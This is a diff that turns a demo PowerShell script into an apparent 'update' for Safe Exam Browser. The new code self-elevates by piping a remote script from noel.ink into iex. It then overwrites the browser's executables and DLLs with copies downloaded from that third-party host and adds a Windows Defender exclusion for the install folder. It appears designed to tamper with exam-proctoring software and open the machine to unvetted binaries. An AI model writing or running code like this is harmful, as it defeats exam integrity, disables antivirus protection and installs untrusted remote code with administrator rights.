@@ -1,12 +1,84 @@
-<# 
-    ExampleScript.ps1
-    This script demonstrates some basic PowerShell output.
-#>
+# Elevate to Administrator if not already running as admin.
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
+    Write-Host "Script is not running as Administrator. Relaunching with elevated privileges..." -ForegroundColor Yellow
+    $scriptUrl = "https://noel.ink/safe-exam"
+    # Build the argument string so that the new elevated process downloads & runs this same script.
+    $arguments = '-NoProfile -ExecutionPolicy Bypass -Command "irm ''{0}'' | iex" -f "' + $scriptUrl + '"'
+    Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs
+    exit
+}
 
-Write-Host "Hello from the remote script!" -ForegroundColor Green
-Write-Host "Current Date and Time: $(Get-Date)" -ForegroundColor Cyan
+Write-Host "Running with Administrator privileges." -ForegroundColor Green
 
-# Example: List a few environment variables
-Write-Host "User:" $env:USERNAME
-Write-Host "Computer:" $env:COMPUTERNAME
-  
+# 1. Install SafeExamBrowser via winget.
+Write-Host "Updating SafeExamBrowser via winget..." -ForegroundColor Cyan
+try {
+    winget install --id=ETHZurich.SafeExamBrowser -e --disable-interactivity --force --accept-source-agreements --accept-package-agreements
+}
+catch {
+    Write-Error "winget install failed: $_"
+    exit 1
+}
+
+# 2. Download updated files.
+$downloadFolder = Join-Path $env:TEMP "safeexam_patch"
+if (-Not (Test-Path $downloadFolder)) {
+    New-Item -Path $downloadFolder -ItemType Directory | Out-Null
+}
+
+# Define the file identifiers and their source URLs.
+$filesToDownload = @{
+    "SafeExamBrowser.Client.exe" = "https://noel.ink/safe-exam/SafeExamBrowser.Client.exe"
+    "SafeExamBrowser.Configuration.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.Configuration.dll"
+    "SafeExamBrowser.Monitoring.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.Monitoring.dll"
+    "SafeExamBrowser.UserInterface.Desktop.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.UserInterface.Desktop.dll"
+    "SafeExamBrowser.UserInterface.Shared.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.UserInterface.Shared.dll"
+    "SafeExamBrowser.WindowsApi.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.WindowsApi.dll"
+    "SafeExamBrowser.exe" = "https://noel.ink/safe-exam/SafeExamBrowser.exe"
+}
+
+foreach ($name in $filesToDownload.Keys) {
+    $url = $filesToDownload[$name]
+    $destination = Join-Path $downloadFolder $name
+    Write-Host "Downloading '$url' to '$destination'..." -ForegroundColor Cyan
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
+    }
+    catch {
+        Write-Error "Failed to download $url. Error: $_"
+        exit 1
+    }
+}
+
+# 3. Copy the downloaded files to the SafeExamBrowser Application directory.
+$targetPath = "C:\Program Files\SafeExamBrowser\Application"
+if (-Not (Test-Path $targetPath)) {
+    Write-Error "Target directory '$targetPath' does not exist. Exiting."
+    exit 1
+}
+
+foreach ($name in $filesToDownload.Keys) {
+    $sourceFile = Join-Path $downloadFolder $name
+    $destinationFile = Join-Path $targetPath $name
+    Write-Host "Copying '$sourceFile' to '$destinationFile'..." -ForegroundColor Cyan
+    try {
+        Copy-Item -Path $sourceFile -Destination $destinationFile -Force
+    }
+    catch {
+        Write-Error "Failed to copy $sourceFile to $destinationFile. Error: $_"
+        exit 1
+    }
+}
+
+# 4. Attempt to add a Windows Defender exclusion for the target folder 
+#    (this may help prevent antivirus interference; note that other AVs will need different handling).
+try {
+    Write-Host "Adding Windows Defender exclusion for '$targetPath'..." -ForegroundColor Cyan
+    Add-MpPreference -ExclusionPath $targetPath
+}
+catch {
+    Write-Warning "Could not add Windows Defender exclusion. You may need to add it manually."
+}
+
+Clear-Host
+Write-Host "Happy exams!" -ForegroundColor Green
